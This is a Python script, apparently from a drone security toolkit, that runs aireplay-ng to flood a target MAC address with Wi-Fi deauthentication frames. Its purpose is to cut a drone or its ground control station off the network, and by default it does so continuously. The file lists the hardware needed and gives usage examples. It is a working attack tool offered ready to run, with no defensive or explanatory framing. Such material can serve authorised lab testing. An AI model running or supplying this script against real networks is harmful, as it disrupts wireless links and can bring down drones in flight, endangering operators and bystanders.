#!/usr/bin/env python3
"""
Wi-Fi Deauthentication Attack Script
Disconnects drone from network using deauth frames

HARDWARE REQUIREMENTS:
- WiFi adapter with monitor mode and packet injection support
- Recommended: Alfa AWUS036ACH or Alfa AWUS036NHA
- See HARDWARE_REQUIREMENTS.md for detailed hardware information
"""

import subprocess
import sys
import time

def deauth_attack(interface: str, target_mac: str, count: int = 0):
    """
    Perform Wi-Fi deauthentication attack
    
    Args:
        interface: Network interface in monitor mode
        target_mac: Target MAC address (drone or GCS)
        count: Number of deauth frames (0 = continuous)
    """
    print(f"[*] Starting deauth attack on {target_mac}")
    print(f"[*] Interface: {interface}")
    
    if count == 0:
        print("[*] Sending continuous deauth frames (Press Ctrl+C to stop)")
    else:
        print(f"[*] Sending {count} deauth frames")
    
    cmd = [
        'aireplay-ng',
        '--deauth',
        str(count) if count > 0 else '0',
        '-a', target_mac,  # AP MAC
        interface
    ]
    
    print(f"[*] Running: {' '.join(cmd)}")
    
    try:
        process = subprocess.Popen(cmd)
        if count == 0:
            # Continuous mode - wait for interrupt
            try:
                process.wait()
            except KeyboardInterrupt:
                print("\n[*] Stopping deauth attack...")
                process.terminate()
        else:
            process.wait()
        
        print("[+] Deauth attack completed")
        return True
        
    except FileNotFoundError:
        print("[-] Error: aireplay-ng not found")
        print("[*] Install with: sudo apt-get install aircrack-ng")
        return False
    except Exception as e:
        print(f"[-] Error during deauth attack: {e}")
        return False

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 wifi_deauth.py <interface> <target_mac> [count]")
        print("Example: python3 wifi_deauth.py wlan0mon 02:00:00:00:01:00")
        print("Example: python3 wifi_deauth.py wlan0mon 02:00:00:00:01:00 10")
        sys.exit(1)
    
    interface = sys.argv[1]
    target_mac = sys.argv[2]
    count = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    
    success = deauth_attack(interface, target_mac, count)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
